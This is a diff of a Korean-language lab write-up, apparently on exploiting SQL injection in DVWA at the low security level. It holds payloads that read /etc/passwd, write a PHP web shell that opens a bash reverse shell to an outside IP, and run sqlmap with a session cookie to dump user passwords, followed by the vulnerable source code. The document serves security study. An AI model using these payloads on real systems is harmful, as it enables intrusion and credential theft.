@@ -47,15 +47,27 @@ md5로 decode해보니 password라는 값이 나옴. 따라서 admin의 비밀�
 
 1' union select null, load_file('/etc/passwd') # 로 /etc/password 를 불러 올 수 있음.
 
-' union select '<?passthru("nc -e /bin/sh 192.160.113.130 8080");?>',null into outfile '/tmp/shell.php'# 다시 테스
+![image](https://github.com/user-attachments/assets/b4316c6f-7fa2-4fa0-8d4a-b2fbcbe377a2)
+
+' union select '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.56.102/8888 0>&1\'"); ?>', null into outfile '/tmp/shell.php'#
+
+로 /tmp 경로에 shell.php 파일을 생성한 후, file inclusion 에서 사용한 취약점을 이용하여 /tmp/shell.php 를 실행하여 리버스쉘 시도
+
+![image](https://github.com/user-attachments/assets/71e53c43-9b86-43ca-a927-5c64ce3ff534)
+
+sqlmap -u "http://192.168.56.110/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=b7h1cscpu6mtaogtllp8r1ccv1; security=low" --dump
+
+SQL Injection 취약점을 이용하여 dvwa 데이터베이스 내 users 테이블에 접근
+
+사용자 계정 정보 및 암호화된 비밀번호와 평문으로 크랙된 비밀번호 확인
 
 ### 페이지 소스
 
-![image](https://github.com/user-attachments/assets/a3d6564a-6a5f-4211-af1e-b54b081b3e40)
+<img src=https://github.com/user-attachments/assets/a3d6564a-6a5f-4211-af1e-b54b081b3e40 width=600>
 
 $id = $_GET['id'];
 
-$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";   → 해당 코드는 $_GET['id']로 전달된 사용자 입력값을 별도의 필터링이나 검증 없이 직접 SQL 쿼리문에 삽입
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";   → 해당 코드는 id로 전달된 사용자 입력값을 별도의 필터링이나 검증 없이 직접 SQL 쿼리문에 삽입
 
 ## Security Level : medium
 
